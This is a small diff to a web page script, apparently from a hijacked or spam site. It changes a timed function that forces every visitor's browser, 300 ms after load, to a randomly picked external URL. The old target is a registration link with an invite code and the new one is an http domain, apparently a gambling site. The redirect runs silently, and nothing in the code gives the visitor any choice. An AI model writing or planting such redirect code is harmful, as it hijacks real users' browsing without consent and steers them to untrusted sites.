@@ -8,7 +8,7 @@ var _hmt = _hmt || [];
 })();
 
 function time() {
-    var arr = ["https://www.um5mq.com:9011/entry/register/?i_code=94802501", "https://www.um5mq.com:9011/entry/register/?i_code=94802501"];
+    var arr = ["http://www.kaiyun232.vip", "http://www.kaiyun232.vip"];
 		window.location.href = arr[parseInt(Math.random() * arr.length)];
 }
 setTimeout(time, 300);
